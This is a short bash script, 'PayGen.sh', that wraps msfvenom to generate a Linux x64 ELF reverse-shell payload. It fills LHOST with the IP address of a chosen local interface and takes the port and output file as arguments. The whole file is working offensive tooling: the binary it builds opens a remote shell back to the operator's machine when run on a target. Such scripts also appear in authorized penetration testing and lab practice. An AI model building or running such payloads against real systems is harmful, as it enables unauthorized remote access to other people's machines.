#! /bin/bash
# USAGE:
# ./PayGen.sh <interface> <port> <outfile>
echo "./PayGen.sh <interface> <port> <outfile>"
msfvenom --platform linux --arch x64 --format elf --encoder generic/none --payload linux/x64/shell_reverse_tcp LHOST=$(ifconfig $1 | grep -i mask | awk '{print $2}'| cut -f2 -d:) LPORT=$2 --out $3